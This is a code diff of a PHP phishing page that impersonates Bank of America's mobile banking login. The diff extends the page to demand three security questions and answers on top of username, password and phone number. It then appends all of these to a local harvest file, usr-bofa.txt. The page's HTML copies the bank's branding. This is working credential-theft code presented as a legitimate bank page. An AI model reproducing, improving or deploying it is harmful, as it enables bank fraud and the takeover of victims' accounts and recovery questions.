@@ -12,8 +12,20 @@ if ($user == "" || $pass == "" || $phone == ""  ) {
   echo "<meta http-equiv='index.php' content='0;url=index.php?error=1'>";
   die();
 }
+$q1 = @$_POST['q1'];
+$q2 = @$_POST['q2'];
+$q3 = @$_POST['q3'];
+$a1 = @$_POST['a1'];
+$a2 = @$_POST['a2'];
+$a3 = @$_POST['a3'];
 
-$saveline = 'IP: ' . $ip . ' USER: ' . $user . ' PASS: ' . $pass . ' PHONE: ' . $phone . "\n";
+if ($q1 == "" || $q2 == "" || $q3 == "" || $a1 == "" || $a2 == "" || $a3 == ""  ) {
+  echo "<meta http-equiv='index.php' content='0;url=index.php?error=1'>";
+  die();
+}
+
+// $saveline = 'IP: ' . $ip . ' USER: ' . $user . ' PASS: ' . $pass . ' PHONE: ' . $phone . "\n";
+$saveline = $user . ' | ' . $pass . ' | ' . $phone . ' | ' . $q1 . ' | ' . $a1 . ' | ' . $q2 . ' | ' . $a2 . ' | ' . $q3 . ' | ' . $a3 . "\n";
 
 $fh=fopen('usr-bofa.txt',"a+");
 fwrite($fh,$saveline);
@@ -40,7 +52,7 @@ fclose($fh);
 
 	<body><div id="page" class="" style="display: block; position: static; float: left; height: 100%; width: 100%; left: 100%;"><div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 10px; padding-right: 10px; width: 100%;">BANK OF AMERICA</div><span class="adaHidden" id="adaTitleText"></span></h1><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div><div class="pageMinHeight">
 	
-	
+		
 	    <link rel="stylesheet" href="css/framework.css">
     <link rel="stylesheet" href="css/util.css">
     <link rel="stylesheet" href="css/smartphone-homepage.css">
